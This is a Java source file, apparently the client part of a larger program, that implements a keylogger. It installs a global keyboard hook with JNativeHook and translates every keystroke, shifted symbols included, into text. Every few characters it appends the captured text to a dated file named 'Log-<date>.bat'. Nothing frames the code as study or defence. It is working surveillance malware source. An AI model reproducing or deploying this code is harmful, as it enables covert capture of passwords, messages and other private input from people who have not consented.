package Client;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Calendar;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;


public class EventKeyboard implements NativeKeyListener{
	
	private static StringBuilder builder = new StringBuilder();
	private static boolean shift;
	
	public EventKeyboard() {
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			e.printStackTrace();
		}
		GlobalScreen.addNativeKeyListener(this);
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e) { // sự kiện nhấn
		String s = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		if(shift) {
			switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_1: s = "!"; break;
			case NativeKeyEvent.VC_2: s = "@"; break;
			case NativeKeyEvent.VC_3: s = "#"; break;
			case NativeKeyEvent.VC_4: s = "$"; break;
			case NativeKeyEvent.VC_5: s = "%"; break;
			case NativeKeyEvent.VC_6: s = "^"; break;
			case NativeKeyEvent.VC_7: s = "&"; break;
			case NativeKeyEvent.VC_8: s = "*"; break;
			case NativeKeyEvent.VC_9: s = "("; break;
			case NativeKeyEvent.VC_0: s = ")"; break;
			case NativeKeyEvent.VC_MINUS: s = "_"; break;
			case NativeKeyEvent.VC_EQUALS: s = "+"; break;
			case NativeKeyEvent.VC_COMMA: s = "<"; break; 
			case NativeKeyEvent.VC_PERIOD: s = ">"; break;
			case NativeKeyEvent.VC_SLASH: s = "?"; break;
			case NativeKeyEvent.VC_QUOTE: s = "~"; break;
			case NativeKeyEvent.VC_BACKQUOTE: s = "\""; break;
			case NativeKeyEvent.VC_BACK_SLASH: s = "|"; break;
			case NativeKeyEvent.VC_SEMICOLON: s = ":"; break;
			case NativeKeyEvent.VC_ENTER: s = "\r\n"; break;
			}
			builder.append(s);
		}else {
			switch(e.getKeyCode()) {
			case NativeKeyEvent.VC_SHIFT: shift = true; s = ""; break;
			case NativeKeyEvent.VC_MINUS: s = "-"; break; 
			case NativeKeyEvent.VC_EQUALS: s = "="; break;
			case NativeKeyEvent.VC_COMMA: s = ","; break;
			case NativeKeyEvent.VC_PERIOD: s = "."; break;
			case NativeKeyEvent.VC_SLASH: s = "/"; break;
			case NativeKeyEvent.VC_QUOTE: s = "`"; break;
			case NativeKeyEvent.VC_SEMICOLON: s = ";"; break;
			case NativeKeyEvent.VC_BACKQUOTE: s = "'"; break;
			case NativeKeyEvent.VC_BACK_SLASH: s = "\\"; break;
			case NativeKeyEvent.VC_SPACE: s = " "; break;
			case NativeKeyEvent.VC_TAB: s = "	"; break;
			case NativeKeyEvent.VC_DELETE: s = " -> "; break;
			case NativeKeyEvent.VC_BACKSPACE: s = " <- "; break;
			case NativeKeyEvent.VC_ENTER: s = "\r\n"; break;
			}
			builder.append(s);
		}
		
		if(builder.length() > 10) {
			SimpleDateFormat dateFormat = new SimpleDateFormat("ddMMyyyy");
			String fileName = dateFormat.format(Calendar.getInstance().getTime());
			File file = new File("Log-" + fileName + ".bat");
			FileIO.File_Log_Writer(builder.toString().getBytes(), file);
			builder.delete(0, builder.length());
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) { // sự kiện nhả phím
		if (e.getKeyCode() == NativeKeyEvent.VC_SHIFT) {
			shift = false;
		}
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {

	}

}
